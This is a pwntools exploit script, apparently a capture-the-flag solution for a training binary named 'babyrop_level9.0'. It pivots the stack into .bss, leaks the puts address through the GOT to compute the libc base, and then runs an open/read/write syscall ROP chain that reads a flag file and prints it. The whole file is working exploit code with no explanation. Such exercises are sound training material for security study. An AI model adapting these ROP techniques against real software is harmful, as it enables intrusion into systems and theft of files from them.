from pwn import *
import time 

binary = './babyrop_level9.0_patched'
elf = ELF(binary)
libc = ELF('./libc.so.6')
context.binary = binary
p = process(binary)


pop_rdi = 0x0000000000402453
pop_rsp_pop_r13_pop_rbp_ret = 0x00000000004014b4
f_string_addr = next(elf.search(b'f\0'))
print(f"Found 'f\\0' at address: {hex(f_string_addr)}")


gdb.attach(p, '''
b * challenge+286
b * challenge+481
''')


flag_addr = elf.bss() + 200
entry_addr = 0x004011d0

offset = 0x70 + 8
bss_addr1 = 0x4150e0 + 8 * 2
payload = flat(	
	pop_rsp_pop_r13_pop_rbp_ret,
	bss_addr1,
	
	0, # r13
	0, # rbp
	pop_rdi,
	elf.got['puts'],
	elf.plt['puts'],
	entry_addr,
)
p.sendline(payload)
p.recvuntil(b"Leaving!\n")
leak = p.recv(6)  # Just receive exactly 6 bytes for the address
puts_addr = u64(leak.ljust(8, b'\x00'))
print(f"Leaked puts address: 0x{puts_addr:x}")


puts_offset = 0x84420
libc_base = puts_addr - puts_offset



rop = ROP(libc)
syscall = libc_base + rop.find_gadget(['syscall', 'ret']).address
pop_rdx = libc_base + 0x00000000000dfc12
pop_rdx_r12 = libc_base + 0x0000000000119431
pop_rax = libc_base + rop.find_gadget(['pop rax', 'ret']).address
pop_rsi = libc_base + rop.find_gadget(['pop rsi', 'ret']).address
ret = 0x000000000040101a

payload = flat(
	pop_rsp_pop_r13_pop_rbp_ret,
	bss_addr1,
	
	0, # r13
	0, # rbp
	
	
	pop_rdi,
	f_string_addr,
	pop_rsi,
	0,
	pop_rax,
	2,
	syscall,
	
	# read
	pop_rdi,
	3, # fd
	pop_rsi,
	flag_addr,
	pop_rdx_r12,
	100,
	0,
	pop_rax,
	0,
	syscall,
	
	# write
	pop_rdi,
	flag_addr,
	elf.sym['puts'],
	
)
p.send(payload)
#time.sleep(0.1)
#p.clean()
#p.send('./flag')

p.interactive()
